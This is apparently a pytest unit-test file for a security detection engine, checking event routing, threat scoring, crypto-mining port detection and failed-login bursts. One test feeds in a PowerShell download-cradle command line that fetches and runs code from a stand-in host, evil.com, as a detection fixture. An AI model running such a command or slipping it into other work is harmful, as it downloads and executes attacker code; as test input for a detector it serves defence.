"""Unit tests for DetectionConsumer — verifies event routing, scoring, and response."""
import tempfile
import time
from pathlib import Path
from unittest.mock import MagicMock

import pytest

from sentinel.engine.consumer import DetectionConsumer
from sentinel.engine.event_bus import EventBus
from sentinel.engine.schema import Event, utc_timestamp
from sentinel.engine.scoring import Scorer
from sentinel.response.quarantine_store import QuarantineStore


@pytest.fixture
def test_env(tmp_path):
    db_path = tmp_path / "events.db"
    bus = EventBus(db_path=db_path)

    q_dir = tmp_path / "quarantine"
    q_dir.mkdir()
    q_db = tmp_path / "quarantine.db"
    store = QuarantineStore(db_path=q_db, quarantine_dir=q_dir)

    scorer = Scorer()
    notifier = MagicMock()
    bridge = MagicMock()

    consumer = DetectionConsumer(
        bus=bus,
        scorer=scorer,
        quarantine_store=store,
        kernel_bridge=bridge,
        notifier=notifier,
        auto_respond=True,
    )
    yield bus, consumer, scorer, store, bridge, notifier, tmp_path
    consumer.stop()
    bus.close()


def test_consumer_start_stop(test_env):
    bus, consumer, _, _, _, _, _ = test_env
    consumer.start()
    assert consumer._thread is not None and consumer._thread.is_alive()
    consumer.stop()
    assert consumer._thread is None


def test_consumer_process_exit_resets_scorer(test_env):
    bus, consumer, scorer, _, _, _, _ = test_env
    pid = 12345
    subj = f"pid:{pid}"

    # Manually add a score to that PID
    from sentinel.engine.scoring import Signal
    scorer.add_signal(Signal(kind="rule_match_low", subject=subj, reason="test"))
    assert scorer.get(subj).total > 0

    # Send process_exit event
    exit_event = Event(
        timestamp=utc_timestamp(),
        source="etw_process",
        event_type="process_exit",
        pid=pid,
    )
    consumer.process_event(exit_event)

    # Scorer subject must be reset to prevent PID recycling issues
    assert scorer.get(subj) is None


def test_consumer_rule_engine_matching(test_env):
    bus, consumer, scorer, _, _, _, _ = test_env
    # LOLBin powershell download cradles rule
    event = Event(
        timestamp=utc_timestamp(),
        source="etw_process",
        event_type="process_create",
        pid=9999,
        image_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        command_line="powershell.exe -nop -enc ... IEX(New-Object Net.WebClient).DownloadString('http://evil.com')",
    )
    sigs = consumer.process_event(event)
    assert len(sigs) >= 1
    assert any("rule_match" in s.kind for s in sigs)
    assert scorer.get("pid:9999") is not None


def test_consumer_stratum_network_detection(test_env):
    bus, consumer, scorer, _, _, _, _ = test_env
    event = Event(
        timestamp=utc_timestamp(),
        source="network",
        event_type="connection",
        pid=8888,
        extra={"dest_port": 3333, "remote_ip": "198.51.100.1"},
    )
    sigs = consumer.process_event(event)
    assert len(sigs) == 1
    assert sigs[0].kind == "stratum_network"
    assert scorer.get("pid:8888") is not None


def test_consumer_bruteforce_detection(test_env):
    bus, consumer, scorer, _, _, _, _ = test_env
    # Send 5 failed login events
    sigs = []
    for _ in range(5):
        ev = Event(
            timestamp=utc_timestamp(),
            source="eventlog",
            event_type="login_failed",
            extra={"source_host": "192.168.1.50"},
        )
        s = consumer.process_event(ev)
        if s:
            sigs.extend(s)

    assert len(sigs) == 1
    assert sigs[0].kind == "failed_login_burst"
    assert scorer.get("source:192.168.1.50") is not None
